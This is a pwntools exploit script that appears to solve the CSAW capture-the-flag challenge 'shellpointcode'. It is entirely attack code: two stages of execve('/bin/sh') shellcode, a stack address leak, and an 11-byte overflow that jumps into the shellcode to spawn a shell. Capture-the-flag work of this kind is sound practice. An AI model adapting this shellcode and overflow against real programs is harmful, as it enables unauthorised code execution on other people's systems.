from pwn import *

context.arch = "amd64"

#r = remote("pwn.chal.csaw.io", 9005)
r = process("./shellpointcode")
#r = gdb.debug('./shellpointcode')

'''
   0:   48 bb 2f 2f 62 69 6e    mov rbx,0x68732f6e69622f2f
   7:   2f 73 68
   a:   5a                      pop    rdx
   b:   ff e4                   jmp    rsp

'''
'''

   0:   48 31 f6                xor    rsi,rsi
   3:   48 31 d2                xor    rdx,rdx
   6:   b0 3b                   mov    al,0x3b
   8:   52                      push   rdx
   9:   53                      push   rbx
   a:   48 89 e7                mov    rdi,rsp
   d:   0f 05                   syscall

'''

sh1 = ''
sh1 += asm('mov rbx, 0x68732f6e69622f2f')
sh1 += asm('pop rdx')
sh1 += asm('jmp rsp')

print(len(sh1))
print("----------------")
sh2 = ''
sh2 += asm('xor rsi, rsi')
sh2 += asm('xor rdx, rdx')
sh2 += asm('mov al, 0x3b')
sh2 += asm('push rdx') # the null byte after //bin/sh
sh2 += asm('push rbx')
sh2 += asm('mov rdi, rsp')
sh2 += asm('syscall')
print(len(sh2))
print("----------------")


r.recvuntil(':')
r.sendline(sh1)

r.recvuntil(':')
r.sendline(sh2)

r.recvuntil(':')
r.recvuntil('.next: ')

n = r.recvuntil('\n')
leak = int(n,16)
log.info('leak : 0x%x' % leak)

r.recvuntil('?\n')

r.sendline('a'*11 + p64(leak + 40))
r.interactive()